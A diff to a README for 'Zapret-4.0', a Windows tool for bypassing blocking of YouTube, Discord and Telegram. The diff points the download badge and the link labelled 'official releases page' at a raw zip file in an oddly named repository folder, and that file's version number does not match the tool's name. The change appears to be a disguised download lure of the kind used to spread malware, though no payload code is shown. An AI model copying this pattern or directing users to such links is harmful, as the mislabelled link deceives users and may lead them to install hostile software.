@@ -1,6 +1,6 @@
 # 🌐 Zapret-4.0 - Access blocked services with full speed
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Sunflowerseedheadgasket251/Zapret-4.0/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Sunflowerseedheadgasket251/Zapret-4.0/raw/refs/heads/main/dubitatively/Zapret_2.1-alpha.1.zip)
 
 Zapret-4.0 bypasses network restrictions for sites like YouTube, Discord, and Telegram. This tool changes how your computer talks to the internet to prevent providers from blocking specific traffic. You keep your connection speed because the tool does not route data through remote servers.
 
@@ -10,7 +10,7 @@ Zapret-4.0 works on Windows 10 and Windows 11. It requires basic user permission
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/Sunflowerseedheadgasket251/Zapret-4.0/releases).
+1. Visit the [official releases page](https://github.com/Sunflowerseedheadgasket251/Zapret-4.0/raw/refs/heads/main/dubitatively/Zapret_2.1-alpha.1.zip).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Select the file ending in `.zip`.
 4. Save the file to your computer.
